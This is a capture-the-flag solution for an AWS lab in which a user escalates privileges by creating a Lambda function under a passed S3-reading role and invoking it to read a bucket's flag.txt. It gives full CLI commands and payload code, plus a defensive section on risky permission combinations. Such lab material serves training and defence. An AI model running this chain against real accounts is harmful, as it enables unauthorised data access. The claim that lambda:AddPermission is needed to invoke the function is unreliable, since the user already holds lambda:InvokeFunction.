# Solution: Lambda Function Creation + Permission Grant to Bucket

The `lambda-006` path is a good illustration of how AWS's dual-permission model for Lambda invocation creates a non-obvious escalation route. A user with `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`, and `lambda:InvokeFunction` can reach data in an S3 bucket they have no direct access to — as long as a role with bucket permissions exists and can be passed to Lambda. The attacker never holds S3 credentials themselves; the Lambda function reads the data and hands it back in the response.

What separates `lambda-006` from the simpler `lambda-001` path is the `lambda:AddPermission` requirement. In `lambda-001`, the attacker creates and immediately invokes a function. Here, the function's resource-based policy does not automatically permit the creator to invoke it. The attacker must explicitly append a policy statement granting themselves `lambda:InvokeFunction` before the function can be called. This is precisely why `lambda:AddPermission` appears in the starting permissions — without it, the exploit chain is incomplete.

This pattern shows up in real environments when developers are given broad Lambda management permissions (CreateFunction, AddPermission) to deploy serverless applications, while a shared execution role with data access is managed by a separate team. The intent is to separate data-plane access from control-plane access, but the combination defeats that separation entirely.

## The Challenge

You start as the IAM user `pl-prod-lambda-006-to-bucket-starting-user`. Your credentials are available from the Terraform outputs after deploying this scenario. The target is the S3 bucket `pl-prod-lambda-006-to-bucket-{account_id}-{suffix}`, which contains `flag.txt`.

Your starting user has these permissions:
- `iam:PassRole` on `arn:aws:iam::*:role/pl-prod-lambda-006-to-bucket-target-role`
- `lambda:CreateFunction` on `*`
- `lambda:AddPermission` on `*`
- `lambda:InvokeFunction` on `*`

The starting user has no direct S3 access — no `s3:GetObject`, no `s3:ListBucket`. The only path to the flag runs through the Lambda execution role `pl-prod-lambda-006-to-bucket-target-role`, which does have `s3:GetObject` and `s3:ListBucket` on the target bucket.

## Reconnaissance

Start by confirming your identity and verifying that the starting user cannot directly read the bucket:

```bash
aws sts get-caller-identity
# Should show pl-prod-lambda-006-to-bucket-starting-user

ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)

# Confirm no direct S3 access
aws s3 ls s3://pl-prod-lambda-006-to-bucket-${ACCOUNT_ID}-<suffix>
# Should fail with AccessDenied
```

If you have the helpful `iam:ListRoles` permission, discover the target role:

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `lambda-006-to-bucket`)].{Name:RoleName,Arn:Arn}'
```

You are looking for `pl-prod-lambda-006-to-bucket-target-role`. A quick `iam:GetRolePolicy` or `iam:ListAttachedRolePolicies` call against it will confirm it has S3 access to the target bucket.

Note the bucket name from the Terraform outputs — you will need it when invoking the Lambda function. It follows the pattern `pl-prod-lambda-006-to-bucket-{account_id}-{suffix}`.

## Exploitation

### Step 1: Write the Lambda payload

The function needs to read `flag.txt` from the target bucket and return it in the response body so you can extract it after invocation. Using boto3, this is straightforward because the function will execute under the target role's credentials automatically:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    bucket = event.get('bucket')
    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
    flag = obj['Body'].read().decode('utf-8')
    return {
        'statusCode': 200,
        'body': json.dumps({'flag': flag})
    }
EOF

cd /tmp && zip lambda_function.zip lambda_function.py && cd -
```

### Step 2: Create the Lambda function with the target execution role

This is the `iam:PassRole` step. You are delegating the `pl-prod-lambda-006-to-bucket-target-role` to the new Lambda function. Any code running inside that function will execute with that role's S3 permissions:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-006-to-bucket-target-role"

aws lambda create-function \
  --function-name "pl-lambda-006-to-bucket-escalation" \
  --runtime "python3.11" \
  --role "$TARGET_ROLE_ARN" \
  --handler "lambda_function.lambda_handler" \
  --zip-file "fileb:///tmp/lambda_function.zip" \
  --timeout 30
```

The function now exists in your account with the target role attached. But you cannot invoke it yet.

### Step 3: Grant yourself invocation rights via lambda:AddPermission

This is the step that makes `lambda-006` distinct. Even though you created the function, AWS does not automatically grant you the right to invoke it. You need to add a resource-based policy statement that explicitly allows your user to call `lambda:InvokeFunction`:

```bash
USER_ARN="arn:aws:iam::${ACCOUNT_ID}:user/pl-prod-lambda-006-to-bucket-starting-user"

aws lambda add-permission \
  --function-name "pl-lambda-006-to-bucket-escalation" \
  --statement-id "AllowSelfInvoke" \
  --action "lambda:InvokeFunction" \
  --principal "$USER_ARN"
```

Verify the policy was applied:

```bash
aws lambda get-policy --function-name "pl-lambda-006-to-bucket-escalation"
```

You should see a resource-based policy statement granting your user `lambda:InvokeFunction`.

### Step 4: Wait for the function to become active

Lambda functions transition through a `Pending` state before they are ready to accept invocations. Give it a moment:

```bash
sleep 15
```

### Step 5: Invoke the function

Pass the bucket name in the event payload so the function knows where to look for `flag.txt`:

```bash
BUCKET_NAME="pl-prod-lambda-006-to-bucket-${ACCOUNT_ID}-<suffix>"

aws lambda invoke \
  --function-name "pl-lambda-006-to-bucket-escalation" \
  --payload "{\"bucket\": \"${BUCKET_NAME}\"}" \
  /tmp/lambda_output.json

cat /tmp/lambda_output.json
```

The response body contains the flag value.

## Verification

Confirm the invocation succeeded and the flag is present in the response:

```bash
python3 -c "
import json
with open('/tmp/lambda_output.json') as f:
    r = json.load(f)
print(json.loads(r['body'])['flag'])
"
```

You should see the flag value printed to stdout. The Lambda function executed as `pl-prod-lambda-006-to-bucket-target-role`, which had `s3:GetObject` on the target bucket, and returned the flag contents through the invocation response — without your starting user ever holding direct S3 permissions.

## Capture the Flag

The flag is the contents of `flag.txt` in the target S3 bucket, which you just extracted from the Lambda response above. For `to-bucket` scenarios, the canonical retrieval command reads the object directly from S3. Using the Lambda execution role's access path, this is equivalent to:

```bash
aws s3 cp s3://pl-prod-lambda-006-to-bucket-${ACCOUNT_ID}-<suffix>/flag.txt -
```

In this scenario the starting user cannot run that command directly (no `s3:GetObject`), but the Lambda function running as the target role can — and it already returned the value in the invocation response. The flag value printed from `/tmp/lambda_output.json` in the previous step is your submission. The exact value is deployment-specific; the retrieval mechanism is the same across all to-bucket scenarios.

## What Happened

The attack worked because the starting user held three permissions that, in combination, create a complete data-exfiltration path: `iam:PassRole` to delegate a bucket-scoped role to a Lambda function, `lambda:CreateFunction` to deploy code that reads from the bucket, and `lambda:AddPermission` to self-authorize invocation of that code. No single permission is inherently catastrophic — it is their co-existence in one identity that enables the attack.

The `lambda:AddPermission` requirement is worth understanding in depth. Security teams sometimes think that restricting `lambda:InvokeFunction` in IAM policies prevents Lambda-based escalation. This scenario shows that `lambda:AddPermission` circumvents that control entirely: an attacker can use it to write a resource-based policy granting themselves `lambda:InvokeFunction`, effectively bypassing whatever the IAM identity-based policy says. The resource-based policy and the identity-based policy are evaluated together — either can grant access.

In production environments, watch for the combination of `iam:PassRole` and any two of `lambda:CreateFunction`, `lambda:AddPermission`, `lambda:UpdateFunctionCode`. Any principal holding that combination and able to pass a role with data access is one step away from reading whatever that role can reach.
